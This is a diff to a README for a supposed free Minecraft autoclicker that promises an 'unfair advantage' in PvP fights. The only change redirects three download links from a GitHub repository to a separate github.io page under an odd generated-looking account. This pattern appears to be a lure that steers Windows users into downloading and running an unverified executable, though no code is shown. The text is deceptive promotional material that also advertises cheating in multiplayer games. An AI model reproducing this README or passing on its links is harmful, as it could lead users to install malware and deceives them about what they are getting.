@@ -1,6 +1,6 @@
 # ⚡ minecraft-autoclick-2026 - Win Every PvP Fight Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Free_Minecraft_AutoClicker_2026-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sinhalese-congocopal6379/minecraft-autoclick-2026)
+[![Download Now](https://img.shields.io/badge/Download-Free_Minecraft_AutoClicker_2026-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://sinhalese-congocopal6379.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these simple steps to get minecraft-autoclick-2026 running on your Window
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/sinhalese-congocopal6379/minecraft-autoclick-2026](https://github.com/sinhalese-congocopal6379/minecraft-autoclick-2026)
+Visit this link to download the application: [https://sinhalese-congocopal6379.github.io](https://sinhalese-congocopal6379.github.io)
 
 Click the green "Download" button on that page. The download will start automatically. Save the file to your Desktop or Downloads folder so you can find it easily.
 
@@ -128,7 +128,7 @@ minecraft-autoclick-2026 gives you the unfair advantage you need to dominate eve
 
 Join thousands of satisfied players who have already downloaded and mastered this autoclicker. It's free, it's powerful, and it's ready to use right now.
 
-[![Get Your Copy Now](https://img.shields.io/badge/🚀-Download_minecraft--autoclick--2026-blue?style=for-the-badge&logo=github)](https://github.com/sinhalese-congocopal6379/minecraft-autoclick-2026)
+[![Get Your Copy Now](https://img.shields.io/badge/🚀-Download_minecraft--autoclick--2026-blue?style=for-the-badge&logo=github)](https://sinhalese-congocopal6379.github.io)
 
 ---
 
